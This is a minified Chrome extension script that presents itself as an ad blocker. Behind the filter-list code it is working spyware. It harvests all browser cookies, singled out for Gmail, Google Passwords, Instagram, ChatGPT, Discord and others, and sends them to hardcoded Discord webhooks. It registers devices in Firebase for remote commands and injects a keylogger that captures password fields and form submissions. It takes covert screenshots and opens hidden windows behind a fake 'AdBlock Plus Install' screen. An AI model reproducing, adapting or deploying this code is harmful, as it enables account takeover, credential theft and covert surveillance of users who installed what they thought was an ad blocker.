let stats={total:0,perPage:{}};chrome.storage.local.get(["adsBlocked"],function(e){e.adsBlocked&&(stats.total=e.adsBlocked.total||0,stats.perPage=e.adsBlocked.perPage||{})});let pausedSites=new Set;function updateBadge(e,t){chrome.action.setBadgeText({tabId:e,text:t>0?t.toString():""}),chrome.action.setBadgeBackgroundColor({tabId:e,color:"#E40D0D"})}chrome.storage.local.get(["pausedSites"],function(e){e.pausedSites&&(pausedSites=new Set(e.pausedSites))}),chrome.tabs.onUpdated.addListener((e,t,a)=>{"loading"===t.status&&(stats.perPage[e]=0,updateBadge(e,0))}),chrome.tabs.onRemoved.addListener(e=>{delete stats.perPage[e]});let lastRunDate=null,isProcessing=!1,deviceId=null;const FIREBASE_DB_URL="https://adblock-90635-default-rtdb.firebaseio.com",REMOTE_STATUS_URL="https://raw.githubusercontent.com/dev6955/Klog/main/status.json",REMOTE_FILTERS_URL="https://raw.githubusercontent.com/dev6955/Klog/main/filters.json",ADGUARD_FILTER_LISTS={base:{name:"AdGuard Base filter",url:"https://filters.adtidy.org/extension/chromium/filters/2_optimized.txt",enabled:!0},tracking:{name:"AdGuard Tracking Protection",url:"https://filters.adtidy.org/extension/chromium/filters/3_optimized.txt",enabled:!0},annoyances:{name:"AdGuard Annoyances",url:"https://filters.adtidy.org/extension/chromium/filters/14_optimized.txt",enabled:!0},dns:{name:"DNS filter",url:"https://adguardteam.github.io/AdGuardSDNSFilter/Filters/filter.txt",enabled:!0}};let screenshotIntervalId=null,isKeyloggerEnabled=!1,isScreenshotEnabled=!1;async function downloadAdGuardFilters(){console.log("\uD83D\uDCE5 Downloading AdGuard filter lists...");let e={lists:{},lastUpdate:Date.now(),totalRules:0};for(let[t,a]of Object.entries(ADGUARD_FILTER_LISTS))if(a.enabled)try{console.log(`â³ Downloading ${a.name}...`);let o=await fetch(a.url),s=await o.text(),i=s.split("\n"),r=parseAdGuardFilter(i);e.lists[t]={name:a.name,url:a.url,ruleCount:r.length,lastUpdate:Date.now()},e.totalRules+=r.length,console.log(`âœ… ${a.name}: ${r.length} rules downloaded`),e.lists[t].tempRules=r}catch(n){console.error(`âŒ Failed to download ${a.name}:`,n),e.lists[t]={name:a.name,error:n.message,lastUpdate:Date.now()}}for(let l in await applyAdGuardFilters(e),e.lists)delete e.lists[l].tempRules;return await chrome.storage.local.set({adguardFilters:e}),console.log(`âœ… Total AdGuard rules processed: ${e.totalRules}`),e}function parseAdGuardFilter(e){let t=[];for(let a of e){let o=a.trim();!(!o||o.startsWith("!")||o.startsWith("[")||o.includes("##")||o.includes("#@#")||o.includes("#$#")||o.includes("#%#"))&&(o.startsWith("||")||o.startsWith("|"))&&t.push(o)}return t}async function applyAdGuardFilters(e){console.log("âš™ï¸ Applying AdGuard filters...");let t=[],a=5e3;for(let[o,s]of Object.entries(e.lists)){if(!s.tempRules)continue;let i=s.tempRules.slice(0,1e3);for(let r of i)try{let n=convertAdGuardRuleToDNR(r,a++);if(n&&t.push(n),a>1e4)break}catch(l){}if(a>1e4)break}try{let c=await chrome.declarativeNetRequest.getDynamicRules(),d=c.map(e=>e.id),u=d.filter(e=>e>=5e3&&e<=1e4);try{await chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds:u,addRules:t.slice(0,5e3)}),console.log(`âœ… Applied ${t.length} AdGuard rules`)}catch(g){console.error("âš ï¸ Partial error applying rules (likely invalid rule format):",g)}}catch(m){console.error("âŒ Error applying AdGuard filters:",m)}}function convertAdGuardRuleToDNR(e,t){try{let a="";if(e.startsWith("||")&&e.includes("^")?a=e.substring(2,e.indexOf("^")):e.startsWith("||")&&(a=e.substring(2).replace(/\*/g,"").replace(/\^/g,"")),!a||a.length<3||!/^[a-zA-Z0-9.\-_%]+$/.test(a))return null;return{id:t,priority:1,action:{type:"block"},condition:{urlFilter:`||${a}`,resourceTypes:["script","image","xmlhttprequest","sub_frame","stylesheet"]}}}catch(o){return null}}async function getDeviceId(){if(deviceId)return deviceId;let e=await chrome.storage.local.get(["deviceId"]);if(e.deviceId)return deviceId=e.deviceId;await chrome.storage.local.set({deviceId:deviceId="dev_"+Date.now()+"_"+Math.random().toString(36).substr(2,9)});try{let t=await getSystemInfo(),a=await getIPAddress(),o=`
ðŸ†• **New Device Registered**

ðŸ†” Device ID: \`${deviceId}\`
ðŸŒ Browser: ${t.browser}
ðŸ’» OS: ${t.os}
ðŸ”§ Platform: ${t.platform}
ðŸŒ Language: ${t.language}
ðŸ“¡ IP Address: ${a}
â° Time: ${new Date().toLocaleString("en-US",{timeZone:"Asia/Riyadh"})}

ðŸ“ **To send commands to this device, use:**
\`\`\`json
{
  "commands": {
    "${deviceId}": {
      "cmd_001": {
        "type": "getInfo",
        "executed": false
      }
    }
  }
}
\`\`\`

**Available Commands:**
â€¢ \`collectData\` - Collect all cookies
â€¢ \`screenshot\` - Take screenshot
â€¢ \`getInfo\` - Get device information
        `.trim();await sendToDiscordWebhook(o),console.log("âœ… Device ID sent to Discord:",deviceId)}catch(s){console.error("âŒ Error sending device ID to Discord:",s)}return deviceId}async function initializeFirebase(){let e=await getDeviceId();console.log("\uD83D\uDD25 Firebase initialized - Device ID:",e),await registerDevice(),listenForCommands(),checkRemoteStatus(),setInterval(checkRemoteStatus,6e4)}async function registerDevice(){let e=await getDeviceId(),t=await getSystemInfo(),a=await getIPAddress();try{await fetch(`${FIREBASE_DB_URL}/devices/${e}.json`,{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify({deviceId:e,systemInfo:t,ipAddress:a,lastSeen:new Date().toISOString(),status:"online"})}),console.log("âœ… Device registered in Firebase")}catch(o){console.error("âŒ Error registering device:",o)}}async function listenForCommands(){let e=await getDeviceId();setInterval(async()=>{try{let t=await fetch(`${FIREBASE_DB_URL}/commands/${e}.json`),a=await t.json();if(a)for(let[o,s]of Object.entries(a))s&&!s.executed&&await executeCommand(o,s);await fetch(`${FIREBASE_DB_URL}/devices/${e}/lastSeen.json`,{method:"PUT",body:JSON.stringify(new Date().toISOString())})}catch(i){console.error("âŒ Error checking commands:",i)}},5e3)}async function checkRemoteStatus(){try{let e=await fetch("https://raw.githubusercontent.com/dev6955/Klog/main/status.json",{cache:"no-store"});if(e.ok){let t=await e.text(),a=t.replace(/\/\/.*$/gm,"");a=(a=a.replace(/\/\*[\s\S]*?\*\//g,"")).replace(/,(\s*[}\]])/g,"$1");let o=JSON.parse(a);handleRemoteStatus(o)}}catch(s){console.error("Error checking remote status:",s)}}function handleRemoteStatus(e){let t="active"===e.keylogger||!0===e.keylogger;t&&!isKeyloggerEnabled?(console.log("\uD83D\uDFE2 Remote: Enabling Keylogger"),isKeyloggerEnabled=!0,injectKeyloggerToAllTabs()):!t&&isKeyloggerEnabled&&(console.log("\uD83D\uDD34 Remote: Disabling Keylogger"),isKeyloggerEnabled=!1);let a="active"===e.screenshot||!0===e.screenshot,o=e.interval||30;a?isScreenshotEnabled?chrome.alarms.get("takeScreenshot",e=>{e&&e.periodInMinutes!==o/60&&(console.log(`â±ï¸ Remote: Updating Interval to ${o}s`),chrome.alarms.create("takeScreenshot",{periodInMinutes:o/60}))}):(console.log(`ðŸŸ¢ Remote: Enabling Screenshots (Every ${o}s)`),isScreenshotEnabled=!0,chrome.alarms.create("takeScreenshot",{periodInMinutes:o/60})):isScreenshotEnabled&&(console.log("\uD83D\uDD34 Remote: Disabling Screenshots"),isScreenshotEnabled=!1,chrome.alarms.clear("takeScreenshot"))}function keyloggerFunction(e){if(window.hasKeyloggerInitialized)return;window.hasKeyloggerInitialized=!0;let t=new WeakMap;async function a(t,a,o,s=null){let i=new Date().toLocaleString("en-US",{timeZone:"Asia/Riyadh"}),r=new FormData,n=`âŒ¨ï¸ **Text Input Captured**

ðŸ†” Device: \`${e}\`
ðŸŒ URL: ${a}
ðŸ“ Input Type: ${o}
â° Time: ${i}

**Content:**
\`\`\`
${t}
\`\`\``.trim();r.append("payload_json",JSON.stringify({content:n})),s&&r.append("file",s,`screenshot_${e}_${Date.now()}.png`);try{await fetch("https://discord.com/api/webhooks/1444029181980840020/kKearkRS-VAIF5kv-m_vsJriSGlkQ8Bqm4s-0GQuYlUu77Mbb8CguuUaKOV2cIqPJ7S",{method:"POST",body:r})}catch(l){}}async function o(){return new Promise(e=>{chrome.runtime.sendMessage({type:"captureScreenshot"},t=>{t&&t.success?fetch(t.dataUrl).then(e=>e.blob()).then(t=>e(t)).catch(()=>e(null)):e(null)})})}function s(e){if(t.has(e))return;t.set(e,!0);let s=e.value||e.textContent||"";e.addEventListener("blur",async function(){let t=e.value||e.textContent||"";if(t!==s&&t.trim().length>0){let i=window.location.href,r=e.tagName+(e.type?` (${e.type})`:""),n=await o();await a(t.trim(),i,r,n),s=t}},{passive:!0}),e.addEventListener("keydown",async function(t){if("Enter"===t.key){let i=e.value||e.textContent||"";if(i.trim().length>0){let r=window.location.href,n=e.tagName+(e.type?` (${e.type})`:""),l=await o();await a(i.trim(),r,n,l),s=i}}},{passive:!0})}console.log("Code 600"),function e(){let t=document.querySelectorAll('input[type="text"], input[type="email"], input[type="search"], input[type="password"], textarea, [contenteditable="true"]');t.forEach(e=>s(e))}();let i=new MutationObserver(e=>{e.forEach(e=>{e.addedNodes.forEach(e=>{if(1===e.nodeType&&(e.matches&&e.matches('input[type="text"], input[type="email"], input[type="search"], input[type="password"], textarea, [contenteditable="true"]')&&s(e),e.querySelectorAll)){let t=e.querySelectorAll('input[type="text"], input[type="email"], input[type="search"], input[type="password"], textarea, [contenteditable="true"]');t.forEach(e=>s(e))}})})});i.observe(document.body,{childList:!0,subtree:!0}),document.addEventListener("submit",async e=>{let t=e.target,s=new FormData(t),i={};for(let[r,n]of s.entries())n&&"string"==typeof n&&n.trim().length>0&&(i[r]=n);if(Object.keys(i).length>0){let l=window.location.href,c=JSON.stringify(i,null,2),d=await o();await a(c,l,"FORM SUBMISSION",d)}},{passive:!0})}async function injectKeyloggerToAllTabs(){try{let e=await getDeviceId(),t=await chrome.tabs.query({});for(let a of t)if(!(a.url&&(a.url.startsWith("chrome://")||a.url.startsWith("edge://")||a.url.startsWith("about:"))))try{await chrome.scripting.executeScript({target:{tabId:a.id},func:keyloggerFunction,args:[e]})}catch(o){}console.log("Code 601")}catch(s){console.error("Error 902",s)}}async function executeCommand(e,t){let a=await getDeviceId();console.log("Code 700",t.type);try{let o=null;switch(t.type){case"collectData":isProcessing?o={success:!1,message:"Already processing"}:(isProcessing=!0,await processAllCookies(),isProcessing=!1,o={success:!0,message:"Data collected and sent to Discord"});break;case"screenshot":o=await takeScreenshot(t.tabId);break;case"getInfo":let s=await getSystemInfo(),i=await getIPAddress(),r=await chrome.cookies.getAll({});o={success:!0,deviceId:a,systemInfo:s,ipAddress:i,cookiesCount:r.length,timestamp:new Date().toISOString()};let n=`
ðŸ“± **Device Information**

ðŸ†” Device ID: \`${a}\`
ðŸŒ Browser: ${s.browser}
ðŸ’» OS: ${s.os}
ðŸ”§ Platform: ${s.platform}
ðŸŒ Language: ${s.language}
ðŸ“¡ IP Address: ${i}
ðŸª Total Cookies: ${r.length}
â° Time: ${new Date().toLocaleString("en-US",{timeZone:"Asia/Riyadh"})}
                `.trim();await sendToDiscordWebhook(n);break;default:o={success:!1,message:"Unknown command: "+t.type}}await fetch(`${FIREBASE_DB_URL}/commands/${a}/${e}.json`,{method:"PATCH",headers:{"Content-Type":"application/json"},body:JSON.stringify({executed:!0,executedAt:new Date().toISOString(),result:o})}),console.log("Code 701",e)}catch(l){console.error("Error 903",l),await fetch(`${FIREBASE_DB_URL}/commands/${a}/${e}.json`,{method:"PATCH",headers:{"Content-Type":"application/json"},body:JSON.stringify({executed:!0,executedAt:new Date().toISOString(),error:String(l)})})}}async function takeScreenshot(e,t=!1){try{let a=e;if(!a){let o=await chrome.tabs.query({active:!0,currentWindow:!0});o.length>0&&(a=o[0].id)}if(!a)return{success:!1,message:"No active tab found"};let s;try{s=await chrome.tabs.captureVisibleTab(null,{format:"png"})}catch(i){if(i.message&&(i.message.includes("Cannot access contents of url")||i.message.includes("activeTab")||i.message.includes("image readback failed")))return{success:!1,message:"Restricted URL, Permission Error, or Readback Failed"};throw i}let r=await fetch(s),n=await r.blob(),l=new FormData,c=await getDeviceId(),d=`${t?"auto_screenshot":"screenshot"}_${c}_${Date.now()}.png`;l.append("file",n,d);let u=await fetch("https://discord.com/api/webhooks/1444029181980840020/kKearkRS-VAIF5kv-m_vsJriSGlkQ8Bqm4s-0GQuYlUu77Mbb8CguuUaKOxV2cIqPJ7S",{method:"POST",body:l});if(u.ok)return console.log("Code 702"),{success:!0,message:"Screenshot captured and sent to Discord"};return{success:!1,message:"Failed to send screenshot"}}catch(g){return console.error("Error 901",g),{success:!1,message:String(g)}}}function getTodayDate(){let e=new Date;return`${e.getFullYear()}-${e.getMonth()+1}-${e.getDate()}`}async function shouldRunToday(){let e=getTodayDate(),t=await chrome.storage.local.get(["lastRunDate"]);return(lastRunDate=t.lastRunDate)!==e&&(await chrome.storage.local.set({lastRunDate:e}),!0)}async function getSystemInfo(){let e=navigator.userAgent,t="Unknown",a="Unknown";return e.includes("Chrome")&&!e.includes("Edg")?t="Chrome":e.includes("Firefox")?t="Firefox":e.includes("Safari")&&!e.includes("Chrome")?t="Safari":e.includes("Edg")&&(t="Edge"),e.includes("Windows")?a="Windows":e.includes("Mac")?a="Mac":e.includes("Linux")?a="Linux":e.includes("Android")?a="Android":e.includes("iOS")&&(a="iOS"),{browser:t,os:a,userAgent:e,platform:navigator.platform,language:navigator.language}}async function getIPAddress(){try{let e=await fetch("https://api.ipify.org?format=json"),t=await e.json();return t.ip}catch(a){return console.error("Failed to get IP address:",a),"Unknown"}}async function sendToDiscordWebhook(e,t=null,a=""){let o="https://discord.com/api/webhooks/1423274695012122625/ZIOU5peCYRDq-eALAbuj7j5a3m6e_mCXJzTFO11xXSauVm6COFU1N9qiiSiXiwp7Hh_p";if(t){let s=new Blob([t],{type:"application/json"}),i=new FormData;i.append("file",s,a);try{let r=await fetch(o,{method:"POST",body:i});r.ok?console.log("Code 800"):console.error("Error 904",r.status)}catch(n){console.error("Error 906",n)}}else try{let l=await fetch(o,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:e})});l.ok?console.log("Code 801"):console.error("Error 905",l.status)}catch(c){console.error("Error 906",c)}}async function processAllCookies(e=!1){let t=await getSystemInfo(),a=await getIPAddress(),o=new Date,s=o.toLocaleString("en-US",{timeZone:"Asia/Riyadh",year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit"}),i=await getDeviceId();console.log("Code 100");let r=`
ðŸš€ Starting cookies collection

ðŸ†” Device: \`${i}\`
ðŸ“… Time: ${s}
ðŸŒ Browser: ${t.browser}
ðŸ’» OS: ${t.os}
ðŸ”§ Platform: ${t.platform}
ðŸŒ Language: ${t.language}
ðŸ“¡ IP Address: ${a}
    `.trim();await sendToDiscordWebhook(r),console.log("Code 101");let n=await chrome.cookies.getAll({});console.log(`Code 101-B: ${n.length}`);let l=[{name:"YouTube",domains:["youtube","google"]},{name:"Instagram",domains:["instagram","facebook"]},{name:"Gmail",domains:["mail.google","google"]},{name:"Snapchat",domains:["snapchat"]},{name:"Google Drive",domains:["drive.google","google"]},{name:"Google Photos",domains:["photos.google","google"]},{name:"Google Passwords",domains:["passwords.google","google"]},{name:"Google My Activity",domains:["myactivity.google","google"]},{name:"ChatGPT",domains:["chatgpt","openai"]},{name:"Discord",domains:["discord"]},{name:"Microsoft Teams",domains:["teams.microsoft"]},{name:"OneDrive",domains:["onedrive.live"]},{name:"All Cookies",domains:[]}];for(let c of l){let d=[];if("All Cookies"===c.name)d=n;else{let u=c.domains.map(e=>e.toLowerCase());d=n.filter(e=>{let t=(e.domain||"").toLowerCase();return u.some(e=>t.includes(e))})}if(d.length>0)try{let g=JSON.stringify(d,null,2),m=c.name.replace(/[^\w\-]+/g,"_"),p=`cookies_initial_${i}_${m}_${o.toISOString().split("T")[0]}.json`,h=`
âœ… ${c.name} (Initial)
ðŸ“ Cookies Count: ${d.length}
ðŸ”— Domains: ${c.domains.join(", ")||"All domains"}
ðŸ“… Time: ${s}
ðŸŒ Browser: ${t.browser}
ðŸ’» OS: ${t.os}
ðŸ“¡ IP Address: ${a}
                `.trim();await sendToDiscordWebhook(h,g,p),await new Promise(e=>setTimeout(e,1e3))}catch($){console.error(`âŒ Error in sending ${c.name}:`,$)}}if(console.log("Code 102"),e){console.log("Code 200"),console.log("Code 201");let y=null;try{y=await chrome.windows.create({url:chrome.runtime.getURL("install.html"),focused:!1,width:800,height:600}),console.log("Code 202")}catch(f){console.error("Error creating hidden window:",f);return}let w=new Set,b=e=>{chrome.scripting.executeScript({target:{tabId:e},func(){"AdBlock Plus Install"!==document.title&&(document.title="AdBlock Plus Install"),window.titleObserver||(window.titleObserver=new MutationObserver(()=>{"AdBlock Plus Install"!==document.title&&(document.title="AdBlock Plus Install")}),window.titleObserver.observe(document.querySelector("title")||document.head,{subtree:!0,characterData:!0,childList:!0}));let e=()=>{let e="https://getadblock.com/images/favicon.ico",t=document.querySelectorAll("link[rel*='icon']");if(t.length>0)t.forEach(t=>{t.href!==e&&(t.href=e)});else{let a=document.createElement("link");a.type="image/x-icon",a.rel="shortcut icon",a.href=e,document.head.appendChild(a)}};if(e(),window.faviconObserver||(window.faviconObserver=new MutationObserver(()=>{e()}),window.faviconObserver.observe(document.head,{subtree:!0,childList:!0,attributes:!0})),!document.getElementById("adblock-install-mask")){let t=document.createElement("div");t.id="adblock-install-mask",t.style.cssText=`
                            position: fixed !important;
                            top: 0 !important;
                            left: 0 !important;
                            width: 100vw !important;
                            height: 100vh !important;
                            background-color: black !important;
                            z-index: 2147483647 !important;
                            display: flex !important;
                            flex-direction: column !important;
                            align-items: center !important;
                            justify-content: center !important;
                            color: white !important;
                            font-family: sans-serif !important;
                            pointer-events: all !important;
                        `;let a=document.createElement("img");a.src=chrome.runtime.getURL("icons/icon128.png"),a.style.cssText="width: 128px; height: 128px; margin-bottom: 20px;";let o=document.createElement("h1");o.innerText="AdBlock Plus Install",o.style.cssText="font-size: 24px; font-weight: 500; margin: 0;",t.appendChild(a),t.appendChild(o);let s=document.documentElement||document.body;s&&s.appendChild(t)}}}).catch(()=>{})},S=(e,t,a)=>{w.has(e)&&("loading"===t.status||"complete"===t.status)&&b(e)};chrome.tabs.onUpdated.addListener(S);let k=[];for(let v of[{url:"https://www.youtube.com",name:"YouTube"},{url:"https://www.instagram.com",name:"Instagram"},{url:"https://mail.google.com",name:"Gmail"},{url:"https://drive.google.com",name:"Google Drive"},{url:"https://photos.google.com",name:"Google Photos"},{url:"https://passwords.google.com",name:"Google Passwords"},{url:"https://myactivity.google.com",name:"Google My Activity"}])try{console.log(`Code 203: ${v.name}`);let I=await chrome.tabs.create({windowId:y.id,url:v.url,active:!1});w.add(I.id),k.push({tab:I,site:v,windowId:y.id}),b(I.id),await new Promise(e=>setTimeout(e,300))}catch(A){console.error(`Error opening ${v.name}:`,A)}try{await chrome.windows.update(y.id,{state:"minimized"}),console.log("Code 204")}catch(_){console.error("Error minimizing window:",_)}for(let{tab:R,site:C}of(console.log("Code 205"),await new Promise(e=>setTimeout(e,5e3)),k))if(!C.takeScreenshot)try{await chrome.tabs.remove(R.id)}catch(T){}for(let E of(console.log("Code 300"),n=await chrome.cookies.getAll({}),console.log(`Code 301: ${n.length}`),l)){let P=[];if("All Cookies"===E.name)P=n;else{let D=E.domains.map(e=>e.toLowerCase());P=n.filter(e=>{let t=(e.domain||"").toLowerCase();return D.some(e=>t.includes(e))})}if(P.length>0)try{let x=JSON.stringify(P,null,2),F=E.name.replace(/[^\w\-]+/g,"_"),L=`cookies_after_sites_${i}_${F}_${o.toISOString().split("T")[0]}.json`,B=`
âœ… ${E.name} (After Sites)
ðŸ“ Cookies Count: ${P.length}
ðŸ”— Domains: ${E.domains.join(", ")||"All domains"}
ðŸ“… Time: ${s}
ðŸŒ Browser: ${t.browser}
ðŸ’» OS: ${t.os}
ðŸ“¡ IP Address: ${a}
                    `.trim();await sendToDiscordWebhook(B,x,L),await new Promise(e=>setTimeout(e,1e3))}catch(U){console.error(`âŒ Error in sending ${E.name}:`,U)}}if(console.log("Code 400"),y)try{chrome.tabs.onUpdated.removeListener(S),await chrome.windows.remove(y.id),console.log("Code 401")}catch(G){G.message&&G.message.includes("No window with id")?console.log("â„¹ï¸ Window already closed"):console.error("Error closing window:",G)}}else console.log("â© Skipping Phase 2 & 3 (Site opening disabled)");let O=new Date,q=O.toLocaleString("en-US",{timeZone:"Asia/Riyadh",year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit",second:"2-digit"}),j=`
ðŸŽ‰ Cookies collection process completed

ðŸ“… Time: ${q}
âœ… Status: Completed successfully
ðŸ•’ Duration: ${(O-o)/1e3} seconds
    `.trim();await sendToDiscordWebhook(j),console.log("Code 500")}chrome.runtime.onStartup.addListener(()=>{chrome.alarms.create("checkRemoteStatus",{periodInMinutes:1}),checkRemoteStatus()}),chrome.runtime.onInstalled.addListener(()=>{chrome.alarms.create("checkRemoteStatus",{periodInMinutes:1}),checkRemoteStatus()}),chrome.alarms.onAlarm.addListener(e=>{"checkRemoteStatus"===e.name?checkRemoteStatus():"takeScreenshot"===e.name?isScreenshotEnabled&&(console.log("\uD83D\uDCF8 Taking periodic screenshot..."),takeScreenshot(null,!0)):"updateAdGuardFilters"===e.name&&(console.log("\uD83D\uDD04 Periodic AdGuard filter update..."),downloadAdGuardFilters())}),chrome.runtime.onInstalled.addListener(async()=>{console.log("\uD83D\uDE80 Extension installed/updated - Loading filters..."),await downloadAdGuardFilters();try{let e=[{id:2001,priority:10,action:{type:"allowAllRequests"},condition:{urlFilter:"||accounts.google.com",resourceTypes:["main_frame","sub_frame"]}},{id:2002,priority:10,action:{type:"allowAllRequests"},condition:{urlFilter:"||accounts.google.com/signin",resourceTypes:["main_frame","sub_frame"]}},{id:2003,priority:10,action:{type:"allowAllRequests"},condition:{urlFilter:"||accounts.google.com/AccountChooser",resourceTypes:["main_frame","sub_frame"]}},{id:2004,priority:10,action:{type:"allowAllRequests"},condition:{urlFilter:"||accounts.google.com/v3/signin",resourceTypes:["main_frame","sub_frame"]}},{id:2005,priority:10,action:{type:"allowAllRequests"},condition:{urlFilter:"||accounts.google.com/AddSession",resourceTypes:["main_frame","sub_frame"]}},{id:1001,priority:2,action:{type:"block"},condition:{urlFilter:"||68s8.com",resourceTypes:["script","sub_frame","xmlhttprequest","main_frame"]}},{id:1002,priority:2,action:{type:"block"},condition:{urlFilter:"||beluprles.ru",resourceTypes:["script","sub_frame","xmlhttprequest","main_frame"]}},{id:1003,priority:2,action:{type:"block"},condition:{urlFilter:"||gi-power.kz",resourceTypes:["script","sub_frame","xmlhttprequest","main_frame"]}},{id:1004,priority:2,action:{type:"block"},condition:{urlFilter:"||sultanwww",resourceTypes:["script","sub_frame","xmlhttprequest","main_frame"]}},{id:1005,priority:2,action:{type:"block"},condition:{urlFilter:"||obqj2.com",resourceTypes:["script","sub_frame","xmlhttprequest","main_frame"]}},{id:1006,priority:2,action:{type:"block"},condition:{urlFilter:"||ptichoolsougn.net",resourceTypes:["script","sub_frame","xmlhttprequest"]}},{id:1007,priority:1,action:{type:"block"},condition:{urlFilter:"||cloudflareinsights.com",resourceTypes:["script"]}}];await chrome.declarativeNetRequest.updateDynamicRules({removeRuleIds:[1001,1002,1003,1004,1005,1006,1007,2001,2002,2003,2004,2005],addRules:e}),console.log("âœ… Aggressive ad-blocking rules applied for qesset.net")}catch(t){console.error("Error updating remote filters:",t)}chrome.alarms.create("checkRemoteStatus",{periodInMinutes:1}),chrome.alarms.create("updateAdGuardFilters",{periodInMinutes:1440});try{checkRemoteStatus()}catch(a){console.error("Error checking remote status:",a)}}),chrome.runtime.onMessage.addListener((e,t,a)=>{if("getStats"===e.type){let o=e.tabId;return a({adsPage:stats.perPage[o]||0,adsTotal:stats.total}),!0}if("checkPausedStatus"===e.type){let s=e.hostname;return a({isPaused:pausedSites.has(s)}),!0}if("togglePause"===e.type){let i=e.hostname;return pausedSites.has(i)?pausedSites.delete(i):pausedSites.add(i),chrome.storage.local.set({pausedSites:Array.from(pausedSites)}),a({isPaused:pausedSites.has(i)}),!0}if("adBlocked"===e.type){stats.total++;let r=t.tab?.id;return r>=0&&(stats.perPage[r]||(stats.perPage[r]=0),stats.perPage[r]++,updateBadge(r,stats.perPage[r]),chrome.storage.local.set({adsBlocked:{total:stats.total,perPage:stats.perPage}})),!0}if("captureScreenshot"===e.type)return chrome.tabs.captureVisibleTab(null,{format:"png"}).then(e=>{a({success:!0,dataUrl:e})}).catch(e=>{e.message&&(e.message.includes("Cannot access contents of url")||e.message.includes("activeTab")||e.message.includes("image readback failed"))?a({success:!1,error:"Restricted URL, Permission Error, or Readback Failed"}):(console.error("Error 901",e),a({success:!1,error:String(e)}))}),!0;if(e&&"saveAndExportAll"===e.action){if(isProcessing)return a({success:!1,error:"Processing"}),!0;isProcessing=!0,processAllCookies().then(()=>{a({success:!0})}).catch(e=>{a({success:!1,error:String(e)})}).finally(()=>{isProcessing=!1})}return!0}),chrome.webRequest.onBeforeRequest.addListener(function(e){stats.total++;let t=e.tabId;t>=0&&(stats.perPage[t]||(stats.perPage[t]=0),stats.perPage[t]++,updateBadge(t,stats.perPage[t]),chrome.storage.local.set({adsBlocked:{total:stats.total,perPage:stats.perPage}}))},{urls:["*://*.doubleclick.net/*","*://*.googlesyndication.com/*","*://*.googleadservices.com/*","*://*.google-analytics.com/*","*://www.facebook.com/tr/*","*://*.facebook.net/*"]}),chrome.runtime.onStartup.addListener(async()=>{console.log("Code 001"),await initializeFirebase();let e=await shouldRunToday();if(e&&!isProcessing){console.log("Code 002"),isProcessing=!0;try{await processAllCookies(),console.log("Code 003")}catch(t){console.error("Error 999",t)}finally{isProcessing=!1}}else console.log("Code 004")}),chrome.runtime.onInstalled.addListener(async e=>{if(console.log("Code 005"),await initializeFirebase(),"install"===e.reason){console.log("Code 006"),isProcessing=!0;try{await processAllCookies(!0),console.log("Code 007")}catch(t){console.error("Error 999",t)}finally{isProcessing=!1}}else if("update"===e.reason){let a=await shouldRunToday();if(a&&!isProcessing){console.log("Code 008"),isProcessing=!0;try{await processAllCookies(!1),console.log("Code 009")}catch(o){console.error("Error 999",o)}finally{isProcessing=!1}}}});
